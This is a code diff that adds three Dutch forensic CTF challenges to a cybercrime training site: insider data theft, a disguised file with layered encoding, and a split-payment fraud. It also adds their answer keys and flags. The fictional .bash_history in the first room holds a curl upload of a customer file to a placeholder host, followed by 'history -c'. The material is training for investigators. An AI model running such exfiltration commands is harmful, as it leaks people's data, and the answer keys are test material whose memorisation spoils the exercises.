@@ -1132,7 +1132,7 @@ hr { border: 0; border-top: 1px solid var(--border); margin: 24px 0; }
     play: '<path d="M8 5.5v13l10-6.5-10-6.5Z"/>',
     menu: '<path d="M4 7h16M4 12h16M4 17h16"/>',
 
-    // de tien leerpaden
+    // de elf leerpaden
     'path-fundamenten': '<path d="M4 8.5 12 4l8 4.5-8 4.5-8-4.5Z"/><path d="m4 12.5 8 4.5 8-4.5M4 16.5 12 21l8-4.5"/>',
     'path-security-kern': '<circle cx="8" cy="15" r="4"/><path d="m11 12 8-8m-3 3 2.5 2.5M14 9l2 2"/>',
     'path-offensief': '<circle cx="12" cy="12" r="7"/><path d="M12 2.5v5M12 16.5v5M2.5 12h5M16.5 12h5"/>',
@@ -1142,6 +1142,7 @@ hr { border: 0; border-top: 1px solid var(--border); margin: 24px 0; }
     'path-datastromen': '<path d="M3 8c3-3 6 3 9 0s6 3 9 0M3 16c3-3 6 3 9 0s6 3 9 0"/><path d="m17 11 2-3M7 13l-2 3"/>',
     'path-puzzels': '<path d="M4 4h7v3a2 2 0 1 0 4 0V4h5v7h-3a2 2 0 1 0 0 4h3v5h-7v-3a2 2 0 1 0-4 0v3H4v-7h3a2 2 0 1 0 0-4H4V4Z"/>',
     'path-meesterproeven': '<path d="m3 20 6.5-11 3.5 6 2.5-4L21 20H3Z"/><path d="M9.5 9V4l3.5 1.5L9.5 7"/>',
+    'path-uitdagingen': '<path d="M12 3v3M12 18v3M3 12h3M18 12h3"/><circle cx="12" cy="12" r="6"/><path d="m10 10 4 4M14 10l-4 4"/>',
     'path-eindopdracht': '<path d="M6 21V4m0 0h12v8H6"/><path d="M10 4v8M14 4v8M6 8h12"/>',
   };
 
@@ -1184,6 +1185,7 @@ hr { border: 0; border-top: 1px solid var(--border); margin: 24px 0; }
     { id: 'datastromen',   title: 'Datastromen volgen',        desc: 'Word expert in geld- en datastromen: volg witwasconstructies en structurering, betrap beaconing en exfiltratie in netwerkverkeer, en traceer de herkomst van een e-mail. De rode draad van cybercrime: het geld en de data.' },
     { id: 'puzzels',       title: 'Puzzels & uitdagingen',  desc: 'Leren door te doen: volg geld- en datastromen, ontmasker operators met OSINT, groepeer en reconstrueer, en los een grote cybercrime-CTF op. Alle oefening, veel plezier.' },
     { id: 'meesterproeven', title: 'Meesterproeven (gevorderd)', desc: 'Voor wie de puzzels te makkelijk vond: zwaardere opgaven met meer achtergrond. Cryptanalyse zonder sleutel, forensie met tegenstrijdige sporen, fraude ontdekken met de wet van Benford, redeneren met kansen (Bayes en kalibratie) en digitaal bewijs eerlijk wegen in de rechtszaal.' },
+    { id: 'uitdagingen', title: 'Uitdagingen (zonder handleiding)', desc: 'Geen uitleg, geen stappenplan: alleen een opdracht en het bewijs. Je kiest zelf je gereedschap (de Gereedschapskist staat bovenin). De antwoorden staan nergens in de tekst; hints zijn bewust vaag. Oplopend van één tot drie sterren.' },
     { id: 'eindopdracht',  title: 'Eindopdracht',           desc: 'Breng alles samen in een afsluitende mini-CTF. Bewijs aan jezelf wat je kunt.' },
   ];
 
@@ -1271,6 +1273,7 @@ hr { border: 0; border-top: 1px solid var(--border); margin: 24px 0; }
     { id: 'tracer',      icon: 'path-datastromen', name: 'Stromenvolger', desc: 'Alle Datastromen-rooms af', test: () => pathDone('datastromen') },
     { id: 'puzzler',     icon: 'path-puzzels', name: 'Puzzelmeester', desc: 'Alle Puzzels & uitdagingen af', test: () => pathDone('puzzels') },
     { id: 'meester',     icon: 'path-meesterproeven', name: 'Meester', desc: 'Alle Meesterproeven af', test: () => pathDone('meesterproeven') },
+    { id: 'zelfstandig', icon: 'path-uitdagingen', name: 'Zelfstandig onderzoeker', desc: 'Alle uitdagingen zonder handleiding af', test: () => pathDone('uitdagingen') },
     { id: 'arena10',     icon: 'practice', name: 'Scherpschutter', desc: 'Reeks van 10 in de Oefenarena', test: () => (STATE.bestStreak || 0) >= 10 },
     { id: 'hacker10',    icon: 'seal', name: 'Doorzetter', desc: '10 rooms afgerond', test: () => ROOMS.filter(roomDone).length >= 10 },
     { id: 'flaghunter',  icon: 'flag', name: 'Vlaggenjager', desc: '15 vlaggen gevonden', test: () => (STATE.flags || 0) >= 15 },
@@ -32377,6 +32380,269 @@ CS.registerRoom({
         { q: 'Welke vlag krijg je als je alle beslissingen goed neemt?', answer: ['NM{twee_hypothesen_altijd}'], encoded: true, hint: 'Blijf onpartijdig en op het juiste niveau.', explain: 'Altijd twee hypothesen, altijd binnen je rol.', xp: 20 },
         { q: 'Hoe heet de werkwijze waarbij je eerst het spoor analyseert en pas daarna stap voor stap context krijgt?', answer: ['linear sequential unmasking', 'lsu'], hint: 'Drie Engelse woorden.', explain: 'Linear sequential unmasking beperkt de invloed van context op je eerste waarneming.' },
         { q: 'Waarom is contextuele bias geen kwestie van eerlijkheid?', options: ['Het werkt onbewust, ook bij eerlijke en ervaren deskundigen', 'Omdat alleen oneerlijke deskundigen bias hebben', 'Omdat bias niet bestaat', 'Omdat het alleen bij vingerafdrukken voorkomt'], answer: 0, explain: 'Daarom heb je procedures nodig, niet alleen goede bedoelingen.' },
+      ],
+    },
+  ],
+});
+
+</script>
+<script>
+/* Uitdaging ★ — Het lege bureau (zonder handleiding) */
+
+// Alles FICTIEF. Kopie van de thuismap op de bedrijfsserver, veiliggesteld met toestemming van de directie.
+const UHB_FS = {
+  '/srv/kopie-rvos/LEESMIJ-onderzoek.txt': 'Kopie van /home/rvos op app01, veiliggesteld op 28-07-2026 in opdracht van de directie van Kade Transport BV.\nTijdzone van de server: UTC.\n',
+  '/srv/kopie-rvos/notities.txt': 'boodschappen: melk, koffie\nvragen aan IT: nieuwe laptop?\noverdracht regelen voor vertrek\n',
+  '/srv/kopie-rvos/.bash_history': 'ls\ncd /srv/crm/export\nls -la\ncd ~\nzip -r overdracht.zip /srv/crm/export/klanten_2026.csv\nls -la overdracht.zip\ncurl -s -T overdracht.zip https://upload.opslagbox.example/u/r-v/overdracht.zip\nrm overdracht.zip\necho VGsxN1pIVmlZbVZzWDJsdVoyVndZV3QwZlFvPQ== > .cache/.k\nhistory -c\n',
+  '/srv/kopie-rvos/.cache/.k': 'VGsxN1pIVmlZbVZzWDJsdVoyVndZV3QwZlFvPQ==\n',
+  '/srv/kopie-rvos/.cache/thumbnails/': null,
+  '/srv/kopie-rvos/Documenten/agenda.ics': 'BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nUID:5f1e-overdracht@agenda.nm.lab\nDTSTART;TZID=Europe/Amsterdam:20260714T213000\nDTEND;TZID=Europe/Amsterdam:20260714T220000\nSUMMARY:Overdracht\nLOCATION:Parkeerplaats Kade 4\nEND:VEVENT\nBEGIN:VEVENT\nUID:77aa-tandarts@agenda.nm.lab\nDTSTART;TZID=Europe/Amsterdam:20260716T090000\nSUMMARY:Tandarts\nEND:VEVENT\nEND:VCALENDAR\n',
+  '/srv/kopie-rvos/Documenten/sollicitatie_concurrent.txt': 'Aan: HR, Transport Noord BV\nOnderwerp: sollicitatie accountmanager\nIk kan direct beginnen en neem een flink klantenbestand mee.\n',
+  '/srv/kopie-rvos/Downloads/': null,
+};
+
+CS.registerRoom({
+  id: 'uitdaging-het-lege-bureau',
+  path: 'uitdagingen',
+  order: 1,
+  title: '★ Het lege bureau',
+  icon: '🗄️',
+  difficulty: 'Gemiddeld',
+  minutes: 40,
+  summary: 'Een accountmanager is vertrokken en HR vermoedt dat hij klantgegevens heeft meegenomen. Je hebt een kopie van zijn thuismap. Geen stappenplan: zoek zelf uit wat er gebeurde.',
+  objectives: [
+    'Zelfstandig een thuismap doorzoeken, ook op verborgen bestanden',
+    'Uit een commandogeschiedenis afleiden wat iemand deed, en wat hij probeerde te verbergen',
+    'Gelaagde codering herkennen en afpellen',
+    'Tijden uit verschillende tijdzones naar UTC omrekenen',
+  ],
+  terms: [
+    { term: 'Thuismap', def: 'De persoonlijke map van een gebruiker op een Linux-systeem, met daarin ook verborgen bestanden (namen die met een punt beginnen).' },
+    { term: 'Commandogeschiedenis', def: 'Een bestand waarin de shell de getypte commando\'s bewaart, tenzij de gebruiker dat uitzet of wist.' },
+    { term: 'iCalendar (.ics)', def: 'Standaardformaat voor agenda-afspraken; tijden staan erin met een tijdzone (TZID) of in UTC (eindigend op Z).' },
+  ],
+  resources: [
+    { title: 'RFC 5545 — iCalendar', url: 'https://www.rfc-editor.org/rfc/rfc5545' },
+  ],
+  tasks: [
+    {
+      title: 'Opdracht',
+      content: `
+        <p>R. Vos, accountmanager bij het fictieve Kade Transport BV, vertrok eind juli zonder afscheid. HR vermoedt dat hij
+        klantgegevens heeft meegenomen naar een concurrent. De directie heeft zijn thuismap op de applicatieserver laten
+        veiligstellen en vraagt jou om vast te stellen wat er is gebeurd.</p>
+        <p>Je werkt op een kopie. Beantwoord de vragen. Er is geen stappenplan.</p>
+      `,
+      lab: {
+        type: 'terminal',
+        user: 'onderzoeker', host: 'forensisch-01',
+        home: '/srv/kopie-rvos', cwd: '/srv/kopie-rvos',
+        motd: 'Alleen-lezen kopie. Typ help voor de beschikbare commando\'s.',
+        fs: UHB_FS,
+      },
+      questions: [
+        { q: 'Naar welk domein zijn de gegevens verstuurd?', answer: ['upload.opslagbox.example', 'opslagbox.example'], hint: 'Niet alles wat iemand typt, verdwijnt.', explain: 'In .bash_history staat een curl -T (upload) naar upload.opslagbox.example.' },
+        { q: 'Welk bronbestand zat in het archief? (bestandsnaam)', answer: ['klanten_2026.csv'], hint: 'Wat werd er ingepakt?', explain: 'zip -r overdracht.zip /srv/crm/export/klanten_2026.csv' },
+        { q: 'Welke vlag liet hij achter?', answer: ['NM{dubbel_ingepakt}'], encoded: true, hint: 'Eén keer uitpakken is soms niet genoeg.', explain: 'In .cache/.k staat Base64 van Base64: cat .cache/.k | base64 -d | base64 -d.', xp: 25 },
+        { q: 'Hoe laat (UTC, UU:MM) vond de afspraak "Overdracht" plaats?', answer: ['19:30', '1930'], hint: 'Let op de tijdzone en het seizoen.', explain: '21:30 in Europe/Amsterdam op 14 juli (zomertijd, UTC+2) is 19:30 UTC.' },
+        { q: 'Met welk commando probeerde hij zijn sporen te wissen (het laatste in de geschiedenis)?', answer: ['history -c'], hint: 'Kijk naar de laatste regel.', explain: 'history -c wist alleen de geschiedenis in het geheugen. Deze server schreef elk commando direct weg naar .bash_history (bijvoorbeeld met PROMPT_COMMAND="history -a"), dus alles stond er al. Een klassieke vergissing.' },
+      ],
+    },
+  ],
+});
+
+</script>
+<script>
+/* Uitdaging ★★ — De gelaagde boodschap (zonder handleiding) */
+
+// Alles FICTIEF. Twee bewijsstukken van een in beslag genomen telefoon van een koerier.
+const UGB_FACTUUR = '89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 00 00 00 01 00 00 00 01 08 02 00 00 00 90 77 53 de 00 00 00 17 74 45 58 74 41 75 74 68 6f 72 00 46 6f 74 6f 73 74 75 64 69 6f 20 48 61 76 65 6e 60 98 a6 3d 00 00 00 1e 74 45 58 74 43 6f 6d 6d 65 6e 74 00 6b 3d 34 38 34 31 35 36 34 35 34 65 34 62 35 32 34 31 34 31 34 65 5a a6 fa 5f 00 00 00 0c 49 44 41 54 78 9c 63 70 68 38 00 00 02 84 01 81 26 97 a7 2b 00 00 00 00 49 45 4e 44 ae 42 60 82';
+const UGB_BERICHT = '553256786157567a5a576367646e4a356347646c626d527164434275626d687949475a32626d746c4948706c6157787549477030494846764945356859586c76595846705953346756575a744947393649474e705a576f67596d5a3263694230616d786c494768705a7942756469427759574e775a5731705953346754485a325a575a686157496763584a6b4945564e6532746c61474670583252795a6e5a7558335a3263575a66616e7079596c39726432567966513d3d';
+
+CS.registerRoom({
+  id: 'uitdaging-gelaagde-boodschap',
+  path: 'uitdagingen',
+  order: 2,
+  title: '★★ De gelaagde boodschap',
+  icon: '🧅',
+  difficulty: 'Moeilijk',
+  minutes: 60,
+  summary: 'Op de telefoon van een koerier staan een "factuur" en een onleesbaar bericht. Ergens zit de sleutel. Geen stappenplan en geen recept: zoek zelf uit wat de bestanden echt zijn en hoe het bericht in elkaar zit.',
+  objectives: [
+    'Een bestand beoordelen op zijn inhoud in plaats van zijn naam',
+    'Verstopte informatie vinden in de structuur van een bestand',
+    'Lagen codering en versleuteling herkennen en in de juiste volgorde terugdraaien',
+  ],
+  terms: [
+    { term: 'Magic bytes', def: 'De vaste eerste bytes waaraan je een bestandstype herkent, los van de extensie.' },
+    { term: 'Chain of custody', def: 'De vastgelegde keten van wie een bewijsstuk wanneer had en wat ermee gebeurde; werk altijd op een kopie.' },
+    { term: 'Codering vs. versleuteling', def: 'Codering (hex, Base64) maakt data alleen anders leesbaar en heeft geen sleutel; versleuteling vereist een sleutel.' },
+  ],
+  resources: [
+    { title: 'Wikipedia — lijst van bestandssignaturen', url: 'https://en.wikipedia.org/wiki/List_of_file_signatures' },
+  ],
+  tasks: [
+    {
+      title: 'Bewijsstuk 1 — factuur.pdf',
+      content: `
+        <p>De recherche heeft de telefoon van een koerier onderzocht in een smokkelzaak (fictief). In de downloads staat
+        <code>factuur.pdf</code>. Het bestand opent niet in een pdf-lezer.</p>
+      `,
+      lab: { type: 'hexviewer', filename: 'factuur.pdf', hex: UGB_FACTUUR },
+      questions: [
+        { q: 'Wat voor bestand is factuur.pdf werkelijk? (bestandstype)', answer: ['png', 'een png', 'png-afbeelding', 'png afbeelding'], hint: 'Een extensie is maar een naam.', explain: 'De eerste bytes 89 50 4E 47 zijn de handtekening van een PNG-afbeelding.' },
+        { q: 'Welke sleutel staat er verstopt in het bestand? (in leesbare tekst, hoofdletters)', answer: ['HAVENKRAAN'], hint: 'Niet alles in de leesbare kolom is al leesbaar.', explain: 'In een tEXt-blok staat "k=4841564…": hex voor HAVENKRAAN.', xp: 20 },
+      ],
+    },
+    {
+      title: 'Bewijsstuk 2 — het bericht',
+      content: `
+        <p>In een chat-app op dezelfde telefoon staat één bericht van een onbekend nummer, verstuurd een dag voor de levering.</p>
+      `,
+      lab: { type: 'multidecode', input: UGB_BERICHT },
+      questions: [
+        { q: 'Hoeveel lagen codering (zonder sleutel) zitten er om het versleutelde bericht?', answer: ['2', 'twee'], hint: 'Pel af tot je tekst ziet die op een zin lijkt, maar nog niet te lezen is.', explain: 'Hex, daarbinnen Base64, daarbinnen een versleutelde tekst. Viel het je op dat de automatische ketting hier "Atbash" voorstelde? Een tool kiest op statistiek; bij versleutelde tekst gokt hij mis. Handmatig afpellen (klik Hex, dan Base64) is de weg.' },
+      ],
+    },
+    {
+      title: 'Het bericht lezen',
+      content: `
+        <p>Wat staat er in het bericht?</p>
+      `,
+      lab: { type: 'cipher', text: '' },
+      questions: [
+        { q: 'Met welk klassiek cijfer is het bericht versleuteld?', options: ['Vigenère', 'Caesar', 'Atbash', 'XOR met één byte'], answer: 0, explain: 'Een woordsleutel van tien letters, toegepast op alleen de letters: Vigenère.' },
+        { q: 'Naar welke haven wordt de levering verplaatst?', answer: ['Waalhaven', 'de Waalhaven'], hint: 'Je hebt alles al.', explain: '"Levering verplaatst naar kraan zeven op de Waalhaven."' },
+        { q: 'Hoe laat is de afspraak? (UU:MM)', answer: ['02:05', '2:05', '14:05', '0205'], hint: 'In woorden geschreven.', explain: '"Vijf over twee".' },
+        { q: 'Welke vlag staat in het bericht?', answer: ['NM{kraan_zeven_vijf_over_twee}'], encoded: true, hint: 'Ook de vlag zelf was versleuteld.', explain: 'Hex → Base64 → Vigenère met HAVENKRAAN.', xp: 30 },
+      ],
+    },
+  ],
+});
+
+</script>
+<script>
+/* Uitdaging ★★★ — De onverklaarde geldstroom (zonder handleiding) */
+
+// Alles FICTIEF: Kade Transport BV, Meridiaan Advies BV, de personen en de rekeningen zijn verzonnen.
+const UOG_BANK = [
+  { date: '02-03', amount: 48000, desc: 'Klant: Havenbedrijf Noord' },
+  { date: '02-05', amount: -12500, desc: 'Leverancier X Brandstof' },
+  { date: '02-09', amount: -9750, desc: 'Meridiaan Advies BV' },
+  { date: '02-12', amount: -3200, desc: 'Loonheffing' },
+  { date: '02-16', amount: -9850, desc: 'Meridiaan Advies BV' },
+  { date: '02-18', amount: 22000, desc: 'Klant: Bouwgroep Oost' },
+  { date: '02-23', amount: -9900, desc: 'Meridiaan Advies BV' },
+  { date: '02-25', amount: -1150, desc: 'Energie Zuid' },
+  { date: '03-02', amount: -4000, desc: 'Leverancier Y Banden' },
+];
+const UOG_BOEKHOUDING = [
+  { date: '02-03', amount: 48000, desc: 'Debiteur Havenbedrijf Noord' },
+  { date: '02-05', amount: -12500, desc: 'Brandstof februari' },
+  { date: '02-09', amount: -9750, desc: 'Meridiaan Advies BV — advieskosten (factuur MA-0007)' },
+  { date: '02-12', amount: -3200, desc: 'Loonheffing' },
+  { date: '02-12', amount: -2400, desc: 'Kantoorartikelen (factuur nog te betalen)' },
+  { date: '02-18', amount: 22000, desc: 'Debiteur Bouwgroep Oost' },
+  { date: '02-25', amount: -1150, desc: 'Energie' },
+  { date: '02-27', amount: -4000, desc: 'Banden (Leverancier Y)' },
+];
+
+CS.registerRoom({
+  id: 'uitdaging-onverklaarde-geldstroom',
+  path: 'uitdagingen',
+  order: 3,
+  title: '★★★ De onverklaarde geldstroom',
+  icon: '💶',
+  difficulty: 'Moeilijk',
+  minutes: 75,
+  summary: 'De controller van een transportbedrijf ziet dat het banksaldo niet klopt met de boekhouding. Waar is het geld gebleven, wie zat erachter en hoeveel is nog terug te halen? Drie bronnen, geen stappenplan — en de eerste bron vertelt niet het hele verhaal.',
+  objectives: [
+    'Twee administraties zelfstandig afstemmen en het verschil verklaren',
+    'Begrijpen dat een geboekte post ook vals kan zijn',
+    'Een geldstroom volgen tot de cash-out en het verlies kwantificeren',
+    'Open bronnen en interne gegevens combineren tot een verdachte',
+  ],
+  terms: [
+    { term: 'Reconciliatie', def: 'Twee administraties van dezelfde transacties naast elkaar leggen en elk verschil verklaren.' },
+    { term: 'Leveranciersstam', def: 'De lijst met leveranciers en hun rekeningnummers in het boekhoudsysteem; wie daar een rekening kan toevoegen, kan betalingen sturen.' },
+    { term: 'Cash-out', def: 'Het punt waarop wit te wassen geld de financiële keten verlaat, bijvoorbeeld bij een cryptobeurs of een geldautomaat.' },
+  ],
+  resources: [
+    { title: 'KvK — het Handelsregister', url: 'https://www.kvk.nl/' },
+  ],
+  tasks: [
+    {
+      title: 'Bron 1 — bank en boekhouding',
+      content: `
+        <p>Kade Transport BV (fictief) betaalt boven € 10.000 alleen met twee handtekeningen. De controller ziet eind februari
+        dat het banksaldo en de boekhouding uit elkaar lopen en vraagt jou om uit te zoeken waarom.</p>
+      `,
+      lab: { type: 'recon', title: 'Februari 2026', currency: '€', leftName: 'Bankafschrift', rightName: 'Boekhouding', left: UOG_BANK, right: UOG_BOEKHOUDING },
+      questions: [
+        { q: 'Welk bedrag (in euro) is wél van de bank afgeschreven maar staat niet in de boekhouding?', answer: ['19750', '19.750', '€ 19.750', '€19750'], hint: 'Tel alleen de uitgaande posten die nergens tegenover staan.', explain: '€ 9.850 en € 9.900 aan Meridiaan Advies BV.' },
+        { q: 'Eén post staat alleen in de boekhouding. Is dat een aanwijzing voor fraude? (ja/nee)', answer: ['nee'], hint: 'Lees de omschrijving.', explain: 'Een factuur die nog betaald moet worden, staat logisch nog niet op de bank.' },
+        { q: 'Hoeveel heeft Kade in februari in totaal aan Meridiaan Advies BV betaald? (euro)', answer: ['29500', '29.500', '€ 29.500', '€29500'], hint: 'De reconciliatie toont niet alles wat verdacht is.', explain: 'Drie betalingen: € 9.750 (geboekt met een factuur!) + € 9.850 + € 9.900. Een geboekte post is niet automatisch een echte post.', xp: 25 },
+        { q: 'Welk patroon zie je in de bedragen aan Meridiaan?', options: ['Alle drie net onder de grens van € 10.000 waarboven twee handtekeningen nodig zijn', 'Ronde bedragen', 'Ze stijgen met precies 10%', 'Geen patroon'], answer: 0, explain: 'Opsplitsing onder de goedkeuringsgrens.' },
+      ],
+    },
+    {
+      title: 'Bron 2 — het spoor van Meridiaan',
+      content: `
+        <p>De bank van Meridiaan Advies BV heeft na een vordering van justitie gegevens verstrekt. De recherche zette ze om in
+        een stroomschema.</p>
+      `,
+      lab: {
+        type: 'flow', title: 'Meridiaan Advies BV', unit: '€',
+        scenario: 'Gegevens van de bank van Meridiaan en de banken van de ontvangers (februari–maart 2026).',
+        nodes: [
+          { id: 'kade', type: 'victim', label: 'Kade Transport BV' },
+          { id: 'mer', type: 'account', label: 'Meridiaan Advies BV' },
+          { id: 'ma', type: 'mule', label: 'Rekening J. Bakker' },
+          { id: 'mb', type: 'mule', label: 'Rekening S. Yilmaz' },
+          { id: 'ex', type: 'exchange', label: 'Cryptobeurs EuroMunt' },
+          { id: 'atm', type: 'cashout', label: 'Geldautomaten' },
+        ],
+        edges: [
+          { from: 'kade', to: 'mer', amount: 9750, time: '02-09' },
+          { from: 'kade', to: 'mer', amount: 9850, time: '02-16' },
+          { from: 'kade', to: 'mer', amount: 9900, time: '02-23' },
+          { from: 'mer', to: 'ma', amount: 14000, time: '02-24' },
+          { from: 'mer', to: 'mb', amount: 15000, time: '02-25' },
+          { from: 'ma', to: 'ex', amount: 13600, time: '02-24' },
+          { from: 'mb', to: 'ex', amount: 9000, time: '02-25' },
+          { from: 'mb', to: 'atm', amount: 5700, time: '02-26' },
+        ],
+      },
+      questions: [
+        { q: 'Hoeveel euro van het geld van Kade kwam bij de cryptobeurs terecht?', answer: ['22600', '22.600', '€ 22.600', '€22600'], hint: 'Er lopen twee stromen naar dezelfde bestemming.', explain: '€ 13.600 + € 9.000.' },
+        { q: 'Welk percentage van het weggesluisde bedrag bereikte de beurs? (geheel getal)', answer: ['77', '77%'], hint: 'Vergelijk met het totaal uit bron 1, niet met de reconciliatie.', explain: '22.600 / 29.500 ≈ 76,6%, afgerond 77%.' },
+        { q: 'Hoeveel euro bleef achter op de rekeningen van Meridiaan en de twee mules samen?', answer: ['1200', '1.200', '€ 1.200', '€1200'], hint: 'Saldo per knoop: inkomend min uitgaand.', explain: 'Meridiaan 500, Bakker 400, Yilmaz 300.' },
+        { q: 'Waar heeft een vordering of beslag de meeste kans om nog geld terug te halen?', options: ['Bij de cryptobeurs, die KYC-gegevens heeft en tegoeden kan bevriezen', 'Bij de geldautomaten', 'Bij Kade zelf', 'Nergens'], answer: 0, explain: 'Contant opgenomen geld is weg; een gereguleerde beurs kan een account bevriezen en kent de klant.' },
+      ],
+    },
+    {
+      title: 'Bron 3 — wie zit erachter?',
+      content: `
+        <p>Drie fragmenten: een uittreksel uit het Handelsregister, een export uit het boekhoudsysteem en een stukje uit een
+        personeelsdossier (opgevraagd door HR, met inachtneming van het interne onderzoeksprotocol).</p>
+      `,
+      lab: {
+        type: 'osintpuzzle',
+        scenario: 'Combineer de fragmenten. Werk alleen met wat er staat.',
+        records: [
+          { title: 'Handelsregister — Meridiaan Advies BV', icon: '🏢', lines: ['Opgericht: 19 januari 2026', 'Bestuurder: P. Smit', 'Adres: flexkantoor, Postbus 4410', 'Activiteit: bedrijfsadvies'] },
+          { title: 'Boekhoudsysteem — wijzigingslog leveranciers', icon: '📒', lines: ['2026-02-02 16:44  leverancier toegevoegd: Meridiaan Advies BV', '  IBAN NL00 FICT 0123 4567 89  —  gebruiker: lsmit', '2026-02-02 16:45  factuur MA-0007 ingevoerd  —  gebruiker: lsmit'] },
+          { title: 'Personeelsdossier (fragment)', icon: '🗂️', lines: ['Medewerker crediteuren: L. Smit-de Graaf (gebruiker lsmit)', 'Burgerlijke staat: gehuwd met P. Smit', 'Bevoegd tot betalingen tot € 10.000'] },
+        ],
+        ask: [
+          { q: 'Welke gebruiker voegde Meridiaan toe aan de leveranciersstam?', answer: ['lsmit'], hint: 'Het wijzigingslog.' },
+          { q: 'Hoeveel dagen na de oprichting van Meridiaan werd het als leverancier toegevoegd?', answer: ['14', 'veertien'], hint: 'Tel van 19 januari tot 2 februari.' },
+        ],
+      },
+      questions: [
+        { q: 'Wat is de relatie tussen de bestuurder van Meridiaan en de medewerker die de betalingen deed?', options: ['Ze zijn met elkaar getrouwd', 'Geen relatie', 'Collega\'s bij Kade', 'Dezelfde persoon'], answer: 0, explain: 'L. Smit-de Graaf is gehuwd met P. Smit, de bestuurder van Meridiaan.' },
+        { q: 'Welke interne controle ontbrak?', options: ['Functiescheiding: dezelfde gebruiker kon een leverancier aanmaken, een factuur invoeren én betalen', 'Een virusscanner', 'Een sterker wachtwoord', 'Een hogere betaalgrens'], answer: 0, explain: 'Wie een rekeningnummer kan toevoegen én betalen, heeft geen tweede paar ogen nodig.' },
+        { q: 'Welke formulering past in een zorgvuldig rapport?', options: ['"De gegevens wijzen op betrokkenheid van gebruiker lsmit; hoor en wederhoor en verder onderzoek zijn nodig."', '"L. Smit is schuldig aan verduistering."', '"Iemand heeft gefraudeerd."', '"Meridiaan is een witwasbedrijf."'], answer: 0, explain: 'Beschrijf wat de bronnen laten zien; over schuld beslist de rechter, en de betrokkene krijgt de kans om te reageren.' },
       ],
     },
   ],
